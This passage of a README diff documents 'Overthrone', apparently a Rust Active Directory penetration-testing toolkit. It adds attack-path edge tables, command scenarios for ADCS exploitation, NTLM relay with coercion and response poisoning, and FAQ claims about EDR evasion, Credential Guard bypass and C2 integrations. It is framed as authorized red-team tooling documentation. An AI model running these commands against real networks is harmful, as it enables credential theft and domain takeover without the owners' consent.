+| **Session Resume** | ✅ `--resume <file>` reloads serialized `EngagementState` from a previous run. VPN dropped? Pick up mid-chain. |
+| **TOML Config** | ✅ `--config <file>` loads engagement params from a TOML file. |
+| **Credential Vault** | ✅ Thread-safe `CredStore` with privilege ranking. |
+| **OPSEC Noise Gate** | ✅ `--stealth` caps noise at `Medium`. High/Critical steps are skipped. |
+| **Auto-Pwn Runner** | ✅ Full engagement orchestrator: enum -> graph -> exploit -> persist -> report. Live kill-chain pipeline, per-step output, 9-section final report. |
+| **WizardSession::new_with_state()** | ✅ Constructs WizardSession from pre-populated EngagementState. Enables skip-Enumerate resume flow. |
 
 ### Reporting (overthrone-scribe)
 
@@ -634,8 +727,23 @@ The attack graph uses weighted edges. Lower cost = easier to exploit. The pathfi
 | `HasSession` | 2 | Active session - credential theft opportunity |
 | `GenericWrite` | 2 | Write attributes - targeted property abuse |
 | `AddMembers` | 2 | Add to group - escalate via group membership |
+| `AllExtendedRights` | 1 | Full control via extended rights |
+| `CreateChild` | 2 | Create child objects - privilege escalation |
+| `WriteSelf` | 2 | Add self to group / modify self |
+| `WriteSPN` | 3 | Write SPN - set up for kerberoasting |
+| `WriteKeyCredentialLink` | 2 | Shadow Credentials write |
+| `AddKeyCredentialLink` | 2 | Add key credential - Shadow Credentials |
+| `WriteAllowedToDelegateTo` | 2 | RBCD write |
+| `AddAllowedToAct` | 2 | Add RBCD permission |
+| `WriteAccountRestrictions` | 3 | Modify account delegation restrictions |
+| `Enroll` | 3 | Enroll in certificate template |
+| `EnrollOnBehalfOf` | 3 | Enrollment agent - ESC3 |
+| `ManageCA` | 1 | Manage Certificate Authority |
+| `ManageCertificates` | 2 | Manage issued certificates |
+| `ManageCertTemplate` | 1 | Manage certificate templates |
 | `ReadLapsPassword` | 2 | Read LAPS - plaintext local admin password |
 | `ReadGmsaPassword` | 2 | Read gMSA - service account password blob |
+| `ReadLapsPasswordExpiry` | 2 | Read LAPS password expiry metadata |
 | `CanRDP` | 3 | RDP access - interactive logon |
 | `CanPSRemote` | 3 | PS Remoting - command execution |
 | `ExecuteDCOM` | 3 | DCOM execution - Excel goes brrr |
@@ -994,6 +1102,63 @@ ovt auto-pwn -H 10.10.10.1 --domain corp.local -u jsmith -p 'Summer2026!'
 # Go get coffee. Come back to: engagement-report.md
 ```
 
+### Scenario 3: "ADCS is everywhere and I have a config file"
+
+```bash
+# Save your engagement config once
+ovt config set dc-host dc01.corp.local
+ovt config set domain corp.local
+ovt config set username jsmith
+ovt config set password 'Summer2026!'
+
+# Or create a named profile for this client
+ovt config profile create mega-corp
+ovt config profile set mega-corp dc-host dc01.corp.local
+ovt config profile set mega-corp domain corp.local
+ovt config profile use mega-corp
+
+# Now every command picks up the settings automatically
+ovt auto-pwn
+ovt adcs enum                                 # Use saved config
+ovt forge adcs --ca-server CA01.corp.local    # Auto-exploit ESC1-9
+ovt shell                                     # Interactive REPL with creds pre-loaded
+```
+
+### Scenario 4: "Crawl with caution and capture creds"
+
+```bash
+# Crawl with source-port rotation + JA3 fingerprint randomization + OPLOCK
+ovt move -H dc01.corp.local -d corp.local -u jsmith -p 'Summer2026!' \
+  --port-rotate --tls-fingerprint --oplock
+
+# Crawl AND respond/poison at the same time
+ovt move -H dc01.corp.local -d corp.local -u jsmith -p 'Summer2026!' \
+  --respond --poison-ip 10.0.0.50
+
+# Session management - list, inspect, clean
+ovt session list
+ovt session show corp.local-10.0.0.1
+ovt session clean --older-than 30d
+```
+
+### Scenario 5: "NTLM relay with all the bells and whistles"
+
+```bash
+# HTTP target captured replayed to SMB with TLS verification
+ovt ntlm http-asymmetric -t http://exchange01.corp.local:80 -p 8080
+
+# Classic SMB->LDAP relay with auto-trigger coercion
+ovt ntlm smb-relay -l 0.0.0.0:445 -t ldap://dc01.corp.local \
+  --auto-coerce-domain corp.local --auto-coerce-user jsmith \
+  --auto-coerce-password 'Summer2026!'
+
+# Relay with TLS verification (legitimate audit mode)
+ovt ntlm relay -l 0.0.0.0:8080 -t smb://dc01.corp.local --tls-verify
+
+# Relay through SOCKS5 proxy
+ovt ntlm relay -l 0.0.0.0:8080 -t smb://dc01.corp.local --socks5-proxy 127.0.0.1:9050
+```
+
 ## FAQ
 
 **Q: Is this legal?**
@@ -1009,16 +1174,25 @@ A: Impacket is a legendary Python protocol library. Overthrone reimplements the 
 A: Memory safety. Single static binary. Native performance. No dependency hell. No Wine. No .NET. Also, explaining Rust lifetime errors to a rubber duck at 4 AM builds character.
 
 **Q: Will this get caught by AV/EDR?**
-A: Overthrone uses native protocol implementations that look identical to legitimate Windows traffic. It doesn't inject into processes, doesn't use PowerShell, doesn't drop assemblies. The built-in EDR evasion module (`edr_bypass.rs`) adds next-gen stealth: ntdll unhooking from a clean disk copy, ETW provider callback abolition, syscall number resolution from fresh ntdll, and sleep masking with memory obfuscation. That said, if you DCSync from a Linux box at 3 AM, any decent SOC will notice.
+A: Overthrone uses native protocol implementations that look identical to legitimate Windows traffic. It doesn't inject into processes, doesn't use PowerShell, doesn't drop assemblies. The built-in EDR evasion module (`edr_bypass.rs`) adds next-gen stealth: ntdll unhooking from a clean disk copy, ETW provider callback abolition, syscall number resolution from fresh ntdll, and sleep masking with memory obfuscation. The Credential Guard bypass module (`lsaiso.rs`) uses raw syscalls (core::arch::asm!) to bypass userland hooks entirely, with a 3-tier fallback (ALPC -> process-memory -> WDigest). That said, if you DCSync from a Linux box at 3 AM, any decent SOC will notice.
 
 **Q: Does it need Wine or Mimikatz or .NET?**
-A: No. No. And no. Every protocol is native Rust. If you find yourself installing Wine to run Overthrone, something has gone terribly wrong.
+A: No. No. And no. Every protocol is native Rust. The Credential Guard bypass and EDR evasion are also native. No DLL proxying. No Python wrappers. No Wine. If you find yourself installing Wine to run Overthrone, something has gone terribly wrong.
 
 **Q: Can I extend it with custom modules?**
 A: Native DLL plugin loading works with a full Plugin trait. WASM plugins load and execute via wasmtime with state persistence, manifest parsing, and smart memory allocation. The workspace architecture makes adding new modules straightforward. PRs welcome.
 
 **Q: What about the C2 integrations?**
 A: They work now. Sliver (mTLS REST), Havoc (REST with auth), Cobalt Strike (Aggressor-style REST). Real HTTP clients, real API calls, real session management. The "aspirational code" era is over.
+
+**Q: I have 14 flags to repeat every run. Help?**
+A: Use `ovt config` for persistent settings (TOML, XDG-aware). `ovt config set dc-host 10.0.0.1` and never type it again. Or create named profiles with `ovt config profile create cobalt-op` and activate with `ovt config profile use cobalt-op`. Also supports `OT_CONFIG` and `OT_PROFILE` env vars. Your fingers will thank you.
+
+**Q: Can I resume a crashed engagement?**
+A: `ovt session list` shows all saved sessions. `ovt auto-pwn --from-session <name>` picks up where you left off - skips enumeration if the state already has users/computers/groups, goes straight to attack. Also `--resume <file>` for the traditional approach. Overthrone saves state after every phase. VPN drops, reboots, coffee breaks - none of them stop the show.
+
+**Q: What's the deal with the interactive shell?**
+A: `ovt shell` drops you into a full REPL with rustyline - tab completion, command history, context-aware prompts, syntax highlighting. Has forge modules (golden/silver/diamond/skeleton) with `use`/`set`/`run`. Also supports WinRM, SMB, and WMI shell types for remote command execution. Think of it as a poor man's Metasploit console, but in Rust and without the warmongering aesthetic.
 
 ## Contributing
 
@@ -1049,7 +1223,7 @@ MIT - use it, modify it, learn from it, build on it. Just don't be evil with it.
 
 <p align="center">
   <sub>Built with mass amounts of mass-produced instant coffee, mass amounts of Rust, and a personal grudge against misconfigured ACLs.</sub><br/>
-  <sub>10 crates. ~152,000 lines of Rust. Zero Python. One smbclient dependency. Minimal regrets. (Some regrets.)</sub><br/>
+  <sub>9 crates. ~160,000 lines of Rust. 1,618 tests. Zero Python. One smbclient dependency. Minimal regrets. (Some regrets.)</sub><br/>
   <sub>Every throne falls. The question is whether you find out from a pentester or from a ransomware note.</sub><br/>
   <sub>We prefer the first option. Your insurance company does too.</sub>
 </p>
